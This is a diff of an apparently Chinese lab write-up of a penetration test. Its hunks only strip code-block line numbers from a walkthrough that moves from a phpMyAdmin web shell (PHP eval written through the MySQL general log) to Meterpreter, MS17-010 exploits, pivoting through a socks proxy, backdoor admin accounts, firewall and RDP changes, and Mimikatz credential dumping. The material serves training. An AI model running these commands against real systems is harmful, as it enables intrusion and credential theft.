@@ -356,19 +356,19 @@
 <h1 id="漏洞利用getshell"><a href="#漏洞利用getshell" class="headerlink" title="漏洞利用getshell"></a>漏洞利用getshell</h1><h2 id="后台Getshell"><a href="#后台Getshell" class="headerlink" title="后台Getshell"></a>后台Getshell</h2><p>进入/phpmyadmin</p>
 <p>默认账号密码登陆成功：root root</p>
 <p><img src="https://img-blog.csdnimg.cn/20210322190456182.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"><br>尝试一下用 <code>into outfile</code>执行写入一句话getshell失败：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &quot;&lt;?php eval($_POST[shell]);?&gt;&quot; into out file &#39;&#x2F;tmp&#x2F;cyshack.php&#39;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select &quot;&lt;?php eval($_POST[shell]);?&gt;&quot; into out file &#39;&#x2F;tmp&#x2F;cyshack.php&#39;</span><br></pre></td></tr></table></figure>
 <p><img src="https://img-blog.csdnimg.cn/20210322190609953.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"><br>原因是写入功能未开启</p>
 <p>尝试<code>开启全局日志</code>利用getshell   </p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &#39;%general%&#39;;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">show variables like &#39;%general%&#39;;</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://img-blog.csdnimg.cn/20210322190657237.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"></p>
 <p>可以看到功能是关闭的且回显日志文件的路径</p>
 <p>尝试开启并更改路径</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set global general_log&#x3D;&#39;on&#39;</span><br><span class="line">set global general_log_file&#x3D;&#39;C:&#x2F;phpStudy&#x2F;www&#x2F;cyshack.php&#39; </span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set global general_log&#x3D;&#39;on&#39;</span><br><span class="line">set global general_log_file&#x3D;&#39;C:&#x2F;phpStudy&#x2F;www&#x2F;cyshack.php&#39; </span><br></pre></td></tr></table></figure>
 
 
 <p><img src="https://img-blog.csdnimg.cn/20210322190714875.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"><br><img src="https://img-blog.csdnimg.cn/20210322190941139.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"><br>写入一句话：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &quot;&lt;?php eval($_POST[shell]);?&gt;&quot;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select &quot;&lt;?php eval($_POST[shell]);?&gt;&quot;</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://img-blog.csdnimg.cn/20210322191019424.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"><br>蚁剑链接：</p>
 <p><img src="https://img-blog.csdnimg.cn/20210322191040921.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"><br>成功getshell：</p>
@@ -378,18 +378,18 @@
 <p><img src="https://img-blog.csdnimg.cn/20210322191208119.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"></p>
 <hr>
 <p>添加用户：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> net user cys hongrisec@2020 &#x2F;add</span><br><span class="line"></span><br><span class="line">(增加一个名为cys 密码为hongrisec@2020的用户名）</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> net user cys hongrisec@2020 &#x2F;add</span><br><span class="line"></span><br><span class="line">(增加一个名为cys 密码为hongrisec@2020的用户名）</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://img-blog.csdnimg.cn/20210322191311967.png#pic_center"><br>查看cys用户:</p>
 <p><img src="https://img-blog.csdnimg.cn/2021032219132539.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"></p>
 <hr>
 <p>关闭防火墙：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall set allprofiles state off</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">netsh advfirewall set allprofiles state off</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://img-blog.csdnimg.cn/20210322191602454.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"></p>
 <hr>
 <h1 id="控制win7"><a href="#控制win7" class="headerlink" title="控制win7"></a>控制win7</h1><h2 id="获取权限"><a href="#获取权限" class="headerlink" title="获取权限"></a>获取权限</h2><p>有两种方法：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">木马反弹shell</span><br><span class="line">SMB ms17_010</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">木马反弹shell</span><br><span class="line">SMB ms17_010</span><br></pre></td></tr></table></figure>
 
 <p>Msvemon生成木马</p>
 <p><img src="https://img-blog.csdnimg.cn/20210322192501798.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"><br>蚁剑上传木马</p>
@@ -399,7 +399,7 @@
 <p><img src="https://img-blog.csdnimg.cn/20210322192617703.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"><br>攻击 拿下win7权限：</p>
 <p><img src="https://img-blog.csdnimg.cn/2021032219263189.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"></p>
 <hr>
-<h2 id="提升权限"><a href="#提升权限" class="headerlink" title="提升权限"></a>提升权限</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Sysinfo</span><br><span class="line">Getuid  (发现是administor权限)</span><br><span class="line">Getsystem (获取system权限)</span><br></pre></td></tr></table></figure>
+<h2 id="提升权限"><a href="#提升权限" class="headerlink" title="提升权限"></a>提升权限</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Sysinfo</span><br><span class="line">Getuid  (发现是administor权限)</span><br><span class="line">Getsystem (获取system权限)</span><br></pre></td></tr></table></figure>
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41874930/article/details/110001596">msf的getsystem命令原理</a></p>
 <p><img src="https://img-blog.csdnimg.cn/20210322192943835.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"></p>
 <hr>
@@ -413,10 +413,10 @@
 <hr>
 <h2 id="远程桌面连接"><a href="#远程桌面连接" class="headerlink" title="远程桌面连接"></a>远程桌面连接</h2><p>Nmap未开启3389</p>
 <p><img src="https://img-blog.csdnimg.cn/2021032219364197.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"><br>meterpreter尝试开启3389：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post&#x2F;windows&#x2F;manage&#x2F;enable_rdp</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">run post&#x2F;windows&#x2F;manage&#x2F;enable_rdp</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://img-blog.csdnimg.cn/20210322193741976.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"><br>尝试远程登录：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rdesktop -g 1440x900 -r disk:LinuxxDisk&#x3D;&#x2F;root&#x2F;Downloads -u STU1 -p &quot;密码&quot; 192.168.47.132</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rdesktop -g 1440x900 -r disk:LinuxxDisk&#x3D;&#x2F;root&#x2F;Downloads -u STU1 -p &quot;密码&quot; 192.168.47.132</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://img-blog.csdnimg.cn/20210322193814844.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"></p>
 <hr>
@@ -430,28 +430,28 @@
 <h1 id="添加路由，挂socks4a代理"><a href="#添加路由，挂socks4a代理" class="headerlink" title="添加路由，挂socks4a代理"></a>添加路由，挂socks4a代理</h1><p>横向渗透前，先将该web服务器配置为代理服务器当作跳板机。</p>
 <h2 id="添加路由"><a href="#添加路由" class="headerlink" title="添加路由"></a>添加路由</h2><p>查看路由信息，添加路由到目标环境网络</p>
 <p><code>目的是</code>为了使得MSF能够通过Win7路由转发访问,使得msf命令能够通过win7 访问到 内网</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Run get_local_subnets   &#x2F;&#x2F;可以用此命令查看目标机器所在内网网端信息与公网网端信息。</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Run get_local_subnets   &#x2F;&#x2F;可以用此命令查看目标机器所在内网网端信息与公网网端信息。</span><br></pre></td></tr></table></figure>
 <p><code>添加内网路由</code> 使得msf6能通过win7路由转发访问内网192.168.52.0/24网段</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run autoroute -s 192.168.52.0&#x2F;24</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">run autoroute -s 192.168.52.0&#x2F;24</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://img-blog.csdnimg.cn/20210322194502617.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"></p>
 <p>这样，我们就可以通过msf 进入.52网段</p>
 <p>马上扫描52网段：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post&#x2F;windows&#x2F;gather&#x2F;arp_scanner RHOSTS&#x3D;192.168.52.0&#x2F;24</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">run post&#x2F;windows&#x2F;gather&#x2F;arp_scanner RHOSTS&#x3D;192.168.52.0&#x2F;24</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://img-blog.csdnimg.cn/20210322194849103.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"></p>
 <p>扫描存活主机：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary&#x2F;scanner&#x2F;netbios&#x2F;nbname</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use auxiliary&#x2F;scanner&#x2F;netbios&#x2F;nbname</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://img-blog.csdnimg.cn/2021032219530666.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"></p>
 <p>内网端口信息：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary&#x2F;scanner&#x2F;portscan&#x2F;tcp</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use auxiliary&#x2F;scanner&#x2F;portscan&#x2F;tcp</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://img-blog.csdnimg.cn/2021032219533417.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"></p>
 <hr>
 <h2 id="挂socks4a代理"><a href="#挂socks4a代理" class="headerlink" title="挂socks4a代理"></a>挂socks4a代理</h2><p>挂代理是为了让<code>其他工具</code>能够通过win7 ，去访问192.168.52.0/24 网段</p>
 <p>配置msf代理：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary&#x2F;server&#x2F;socks_proxy</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use auxiliary&#x2F;server&#x2F;socks_proxy</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://img-blog.csdnimg.cn/20210322200034597.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"></p>
 <p><img src="https://img-blog.csdnimg.cn/20210322200044762.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"><br>run之后会<code>出现 starting...</code> ，<code>jobs</code>可以查看当前代理任务，如果<code>出现stoping...</code>，可以尝试更改 <code>SRVHOST</code>配置 或者 修改如下配置文件</p>
@@ -460,34 +460,34 @@
 <p><img src="https://img-blog.csdnimg.cn/20210322200354840.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"></p>
 <p>设置代理成功后 使用其他工具时需要添加<code>proxychains:</code></p>
 <p>Nmap扫描 192.168.52.141</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains nmap -Pn -sT 192.168.52.141  &#x2F;&#x2F; -Pn -sT 不可少</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">proxychains nmap -Pn -sT 192.168.52.141  &#x2F;&#x2F; -Pn -sT 不可少</span><br></pre></td></tr></table></figure>
 <p><img src="https://img-blog.csdnimg.cn/20210322200440271.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"></p>
 <hr>
 <h1 id="渗透win2003-远程登录"><a href="#渗透win2003-远程登录" class="headerlink" title="渗透win2003(远程登录)"></a>渗透win2003(远程登录)</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>扫描主机版本</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_version </span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_version </span><br></pre></td></tr></table></figure>
 
 <p> 扫描192.168.52.141系统版本信息 是win2003</p>
 <p><img src="https://img-blog.csdnimg.cn/2021032220082548.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"><br>nmap 扫描端口等</p>
 <hr>
 <h2 id="尝试攻击"><a href="#尝试攻击" class="headerlink" title="尝试攻击"></a>尝试攻击</h2><p>由nmap看到开放445端口<br>尝试永恒之蓝攻击win2003</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_psexec   &#x2F;&#x2F;windows 2003 的攻击模块</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set payload windows&#x2F;meterpreter&#x2F;bind_tcp</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_psexec   &#x2F;&#x2F;windows 2003 的攻击模块</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set payload windows&#x2F;meterpreter&#x2F;bind_tcp</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://img-blog.csdnimg.cn/20210322201157979.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"><br>可以看到能获取权限但是win7直接断开连接</p>
 <p>再次尝试：</p>
 <p><img src="https://img-blog.csdnimg.cn/20210322201227714.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"><br>依旧是：（经常性断掉win7 控制权，导致断一次我就要重新打一次）</p>
 <p><img src="https://img-blog.csdnimg.cn/20210322201238148.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"><br>我去！！！终于知道哪里错了</p>
 <p>得到win7权限之后 一定要首先看一下自己的权限</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Getuid</span><br><span class="line">Getsystem</span><br><span class="line">run post&#x2F;windows&#x2F;manage&#x2F;enable_rdp(关闭防火墙)</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Getuid</span><br><span class="line">Getsystem</span><br><span class="line">run post&#x2F;windows&#x2F;manage&#x2F;enable_rdp(关闭防火墙)</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://img-blog.csdnimg.cn/202103222013504.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"></p>
 <p>再打一次：成了但是其他命令无法执行</p>
 <p><img src="https://img-blog.csdnimg.cn/20210322201402952.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"><br>尝试<code>ms08-067</code>没打下来</p>
 <p>可以<code>执行一些系统权限的命令</code>，添加管理员用户尝试3389登录</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary&#x2F;admin&#x2F;smb&#x2F;ms17_010_command </span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use auxiliary&#x2F;admin&#x2F;smb&#x2F;ms17_010_command </span><br></pre></td></tr></table></figure>
 
 <p>因为开了445端口：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary&#x2F;admin&#x2F;smb&#x2F;ms17_010_command</span><br><span class="line">show options</span><br><span class="line">set rhosts 192.168.52.141</span><br><span class="line">set command net user cyshack @cys121@ &#x2F;add  #添加用户</span><br><span class="line">run  #成功执行</span><br><span class="line">set command net localgroup administrators cyshack &#x2F;add  #管理员权限</span><br><span class="line">run  #成功执行</span><br><span class="line">set command &#39;REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 00000000 &#x2F;f&#39;  &#x2F;&#x2F;开启3389端口</span><br><span class="line">run #成功执行</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use auxiliary&#x2F;admin&#x2F;smb&#x2F;ms17_010_command</span><br><span class="line">show options</span><br><span class="line">set rhosts 192.168.52.141</span><br><span class="line">set command net user cyshack @cys121@ &#x2F;add  #添加用户</span><br><span class="line">run  #成功执行</span><br><span class="line">set command net localgroup administrators cyshack &#x2F;add  #管理员权限</span><br><span class="line">run  #成功执行</span><br><span class="line">set command &#39;REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 00000000 &#x2F;f&#39;  &#x2F;&#x2F;开启3389端口</span><br><span class="line">run #成功执行</span><br></pre></td></tr></table></figure>
 
 <p>系统权限命令：</p>
 <p><img src="https://img-blog.csdnimg.cn/20210322202013158.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"></p>
@@ -495,42 +495,42 @@
 <p><img src="https://img-blog.csdnimg.cn/20210322202107255.png#pic_center"></p>
 <p>3389：</p>
 <p><img src="https://img-blog.csdnimg.cn/20210322202121752.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"><br>然后使用proxychains连接他的3389(cyshack用户登录)</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Proxychains rdesktop 192.168.52.141 </span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Proxychains rdesktop 192.168.52.141 </span><br></pre></td></tr></table></figure>
 
 <p><img src="https://img-blog.csdnimg.cn/20210322202215105.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"></p>
 <p><img src="https://img-blog.csdnimg.cn/20210322202222526.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"></p>
 <hr>
 <h1 id="走向win2008-C盘共享传马"><a href="#走向win2008-C盘共享传马" class="headerlink" title="走向win2008(C盘共享传马)"></a>走向win2008(C盘共享传马)</h1><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qwerzxcvb123/article/details/105215372/">msf攻击win2008实例</a></p>
 <h2 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h2><p>扫描版本信息：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_version</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_version</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://img-blog.csdnimg.cn/20210322202624260.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"><br>Nmap：开启了135 和445 , 3389未开启</p>
 <p><img src="https://img-blog.csdnimg.cn/20210322202730388.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"></p>
 <p><img src="https://img-blog.csdnimg.cn/20210322202736706.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"><br>永恒之蓝和135端口漏洞都失败  放弃漏洞</p>
 <p><img src="https://img-blog.csdnimg.cn/20210322202753303.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"><br>使用命令：可添加用户</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary&#x2F;admin&#x2F;smb&#x2F;ms17_010_command</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use auxiliary&#x2F;admin&#x2F;smb&#x2F;ms17_010_command</span><br></pre></td></tr></table></figure>
 <p><img src="https://img-blog.csdnimg.cn/20210322203010112.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"></p>
 <hr>
 <h2 id="另辟蹊径"><a href="#另辟蹊径" class="headerlink" title="另辟蹊径"></a>另辟蹊径</h2><p>win7中得到域内用户密码：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kiwi_cmd sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kiwi_cmd sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>
 
